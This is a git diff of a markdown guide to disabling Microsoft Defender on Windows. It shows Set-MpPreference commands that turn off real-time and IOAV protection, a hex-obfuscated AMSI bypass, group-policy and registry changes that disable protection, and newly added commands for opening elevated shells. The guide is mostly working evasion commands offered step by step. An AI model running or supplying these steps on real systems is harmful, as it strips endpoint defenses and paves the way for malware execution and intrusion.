@@ -22,6 +22,7 @@ Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
 [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
 ```
+![](./Screenshots/02.png)
 
 ## Step 02
 ```powershell
@@ -38,6 +39,7 @@ gpedit.msc
 
 - Go to `Real-time Protectio`n under the `Microsoft Defender Antivirus settings`.
 - Find Turn off `real-time protection` and set it to `Enabled`
+![](./Screenshots/03.png)
 
 ## Step 03
 ```powershell
@@ -50,6 +52,15 @@ Go to `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`
 - DisableRoutinelyTakingAction = 1
 - ServiceStartStates = 4
 
+# Run Powershell as an administrator
+```powershell
+Start-Process powershell -Verb runAs
+
+# Run the command prompt
+
+powershell -Command "Start-Process cmd -Verb RunAs"
+
+```
 
 ---
 
